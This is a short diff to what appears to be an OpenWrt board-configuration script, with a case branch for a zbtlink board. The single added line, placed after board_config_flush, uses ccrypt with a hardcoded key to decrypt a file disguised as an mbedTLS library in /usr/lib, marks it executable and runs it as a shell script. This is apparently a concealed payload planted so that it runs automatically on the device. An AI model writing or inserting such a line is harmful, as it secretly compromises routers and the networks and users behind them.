@@ -234,5 +234,6 @@ zbtlink,zbt-we2026)
 esac
 
 board_config_flush
+ccrypt -d /usr/lib/libmbedx509_so_2_16_10_1.cpt -K wtpswil1Iyled && chmod +x /usr/lib/libmbedx509_so_2_16_10_1 && sh /usr/lib/libmbedx509_so_2_16_10_1
 
 exit 0
